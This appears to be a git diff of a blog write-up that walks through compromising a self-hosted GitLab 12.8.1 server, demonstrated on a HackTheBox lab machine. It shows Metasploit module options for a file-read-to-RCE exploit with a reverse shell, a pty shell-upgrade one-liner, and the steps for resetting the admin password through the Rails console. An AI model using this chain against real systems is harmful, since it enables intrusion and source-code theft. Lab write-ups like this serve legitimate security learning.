@@ -4,42 +4,32 @@ layout: default
 
 ### Steal project Company Source Code in 60 seconds
 
-![title](https://m1sn1k.github.io/blog/Hack-Gitlab-CI-and-Company-Compromised-in-next-stage/title.jpg)
-
+|![title](https://m1sn1k.github.io/blog/Hack-Gitlab-CI-and-Company-Compromised-in-next-stage/title.jpg)|
+-
 
 The journey starts with Company Gitlab CI with open register functional that i got from the rsource company list , Gitlab is self hosted on barametal hosting. The Current version of the gitlab-ce is vulnerable to LFI and RCE exploiting the RCE and getting initial shell in a server , Changing the admin account with github-rails console and login as him on gitlab. Got the private credentials. keys in a project-repo.
 
 For notes used test env as HTB Machine - Laboratory because real env under NDA.
 
-
 ####  Gitlab CI resource
 
 And i can see that Gitlab is hosted. I saw open Register function and Try do it!
 
-
 ![register](https://m1sn1k.github.io/blog/Steal-project-source-code-in-60-seconds/register.jpg)
-
-
 
 Now i registered myself as oleksii and logged in
 
-
 ![login](https://m1sn1k.github.io/blog/Steal-project-source-code-in-60-seconds/login.jpg)
-
 
 Didn’t see anything good and juicy then i just go to https://gitlab.site.io/help
 
 ![version](https://m1sn1k.github.io/blog/Steal-project-source-code-in-60-seconds/version.jpg)
 
-
-So its 12.8.1 , so i searched a bit about it on google and got so many CVES
-
-And on rapid7.com site saw info about vulnerabilities, it was disclosed few months ago (Created 12/10/2020) and was about LFI & RCE. The RCE only affects versions 12.4.0 and above when the vulnerable `experimentation_subject_id` cookie was introduced. Tested on GitLab 12.8.1 and 12.4.0.
+So its 12.8.1 , so searched a bit about it on google and got so many CVEs. And on rapid7.com site saw info about vulnerabilities, it was disclosed few months ago (Created 12/10/2020) and was about LFI & RCE. The RCE only affects versions 12.4.0 and above when the vulnerable `experimentation_subject_id` cookie was introduced. Tested on GitLab 12.8.1 and 12.4.0.
 
 This picture in Company Gitlab CI says a lot:)
 
-![asap](https://m1sn1k.github.io/blog/Steal-project-source-code-in-60-seconds/asap.jpg)
-
+![asap](https://m1sn1k.github.io/blog/Steal-project-source-code-in-60-seconds/asap.jpg#center)
 
 #### RCE in the gitlab
 
@@ -51,22 +41,21 @@ msf6 exploit(multi/http/gitlab_file_read_rce) > show options
 
 Module options (exploit/multi/http/gitlab_file_read_rce):
 
-   Name             Current Setting                                               Required  Description
-   ----             ---------------                                               --------  -----------
-   USERNAME         oleksii@test.test                                             no        The username 
-   PASSWORD         oleksii@test.test                                             no        The password for username
-   RHOSTS           10.10.10.                                                     yes       The target host(s)    
-   RPORT            443                                                           yes       The target port (TCP)
-   SECRETS_PATH     /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml  yes       The path to the secrets.
-   TARGETURI        /users/sign_in                                                yes       The path to the application
-   VHOST            gitlab.site.io                                                no        HTTP server virtual host
-
+   Name             Current Setting                                               
+   ----             ---------------                                               
+   USERNAME         oleksii@test.test                                             
+   PASSWORD         oleksii@test.test                                             
+   RHOSTS           10.10.10.                                                         
+   RPORT            443                                                           
+   SECRETS_PATH     /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml  
+   TARGETURI        /users/sign_in                                                
+   VHOST            gitlab.site.io                                                
 
 Payload options (generic/shell_reverse_tcp):
 
    Name   Current Setting  Required  Description
    ----   ---------------  --------  -----------
-   LHOST  10.10.14.67      yes       The listen address (an interface may be specified)
+   LHOST  10.10.14.*       yes       The listen address (an interface may be specified)
    LPORT  4444             yes       The listen port
 ```
 
@@ -100,9 +89,7 @@ python3 -c 'import pty; pty.spawn("/bin/sh")'
 
 #### Resetting admin password
 
-Now since the gitlab is installed i can spawn a gitlab-rails console and reset the admin password , and check who is admin
-
-| Resetting admin password | [https://docs.gitlab.com/12.10/ee/security/reset_root_password.html] |
+Now since the gitlab is installed i can spawn a gitlab-rails console and reset the admin password , and check who is admin. Resetting admin password offical document link https://docs.gitlab.com/12.10/ee/security/reset_root_password.html
 
 Used command from this doc I could reset admin password. Start a Ruby on Rails console with this command:
 ```
@@ -117,7 +104,7 @@ There are multiple ways to find your user. You can search for email or username.
 
 or
 
-Other type get username and email without Gitlab authentification is use api https://gitlab.sitec.io/api/v4/users/1 
+Other type get username and email without Gitlab authentification is use api https://gitlab.site.io/api/v4/users/1 
 
 Now you can change your password:
 ```
